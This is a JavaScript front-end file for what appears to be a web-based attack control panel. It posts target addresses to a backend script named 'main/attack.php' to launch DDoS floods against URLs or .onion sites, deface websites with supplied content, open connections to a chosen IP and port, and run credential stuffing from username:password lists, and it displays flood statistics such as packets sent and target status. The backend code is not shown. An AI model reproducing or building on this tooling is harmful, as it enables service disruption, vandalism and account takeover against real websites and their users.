function showTab(tabId) {
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(tab => tab.style.display = 'none');
    document.getElementById(tabId).style.display = 'block';
}

async function fetchData(url, options) {
    try {
        const response = await fetch(url, options);
        if (!response.ok) {
            const message = `An error occurred: ${response.status}`;
            throw new Error(message);
        }
        try {
            return await response.json();
        } catch (e) {
            return await response.text();
        }
    } catch (error) {
        console.error('Fetch error:', error);
        alert('Fetch error: ' + error.message);
        throw error;
    }
}

async function startDDoS() {
    const target = document.getElementById('ddos-target').value;
    if (!target) {
        alert('Please enter a target URL or .onion address.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=ddos`
        });

        if (typeof data === 'object' && data !== null && data.status === 'success') {
            updateStatistics(data);
        } else {
            alert('DDoS attack failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
        }
    } catch (error) {
        console.error('DDoS error:', error);
        alert('An error occurred while initiating the DDoS attack: ' + error.message);
    }
}

async function startDefacement() {
    const target = document.getElementById('defacement-target').value;
    const content = document.getElementById('defacement-content').value;
    if (!target || !content) {
        alert('Please enter a target URL and defacement content.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=defacement&content=${encodeURIComponent(content)}`
        });

        if (typeof data === 'string' && data.includes('Defacement successful')) {
            alert('Defacement successful!');
        }
         else {
            alert('Defacement failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
        }
    } catch (error) {
        console.error('Defacement error:', error);
        alert('An error occurred while initiating the defacement: ' + error.message);
    }
}

async function establishConnection() {
    const target = document.getElementById('connection-target').value;
    const port = document.getElementById('connection-port').value;
    if (!target || !port) {
        alert('Please enter a target IP/URL and port.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=connection&port=${encodeURIComponent(port)}`
        });

        if (typeof data === 'string' && data.includes('Connection established')) {
            alert('Connection established!');
        } else {
            alert('Connection failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
        }
    } catch (error) {
        console.error('Connection error:', error);
        alert('An error occurred while establishing the connection: ' + error.message);
    }
}

async function startCredentialStuffing() {
    const target = document.getElementById('credential-target').value;
    const credentials = document.getElementById('credential-list').value;
    if (!target || !credentials) {
        alert('Please enter a target URL and a username:password list.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=credentialStuffing&credentials=${encodeURIComponent(credentials)}`
        });

        if (typeof data === 'string' && data.includes('Credential stuffing started')) {
            alert('Credential stuffing started!');
        } else {
            alert('Credential stuffing failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
        }
    } catch (error) {
        console.error('Credential stuffing error:', error);
        alert('An error occurred while initiating credential stuffing: ' + error.message);
    }
}

function updateStatistics(data) {
    if (typeof data === 'object' && data !== null) {
        document.getElementById('mbps').innerText = data.mbps || 'N/A';
        document.getElementById('packets-sent').innerText = data.packetsSent || 'N/A';
        document.getElementById('target-status').innerText = data.targetStatus || 'N/A';
        document.getElementById('time-elapsed').innerText = data.timeElapsed || 'N/A';
    }
}